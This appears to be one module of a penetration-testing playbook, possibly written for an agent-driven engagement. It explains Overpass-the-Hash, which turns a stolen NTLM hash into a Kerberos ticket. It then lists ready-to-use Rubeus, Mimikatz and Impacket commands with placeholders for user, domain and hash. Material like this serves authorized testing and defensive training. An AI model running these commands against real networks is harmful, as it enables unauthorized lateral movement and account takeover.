# Internal Network, Host, And Identity Operations: Basic Internal Network Attacks: Overpass-the-Hash (Pass-the-Key)

> Apply [../module-continuity.md](../module-continuity.md). Keep the same engagement and parent path as the calling route. Load this scene only when current evidence supports its prerequisites.

### Overpass-the-Hash (Pass-the-Key)

**Concept**: Use NTLM hash to request a TGT via Kerberos AS-REQ with RC4-HMAC encryption. This converts a hash into a full Kerberos TGT.

**Why this is often better than PTH**: You get a TGT, which enables Kerberos authentication to any service. PTH is NTLM-only.

```powershell
# Rubeus
Rubeus.exe asktgt /user:<user> /domain:<domain> /rc4:<NTHASH> /ptt
# Mimikatz
mimikatz # sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash> /run:cmd.exe
# Impacket
getTGT.py <domain>/<user> -hashes :<NTHASH>
export KRB5CCNAME=<user>.ccache
```


## Scene Exit

Return result classification, evidence, changed assumptions, affected paths, persistent changes, and the next parent-path decision.
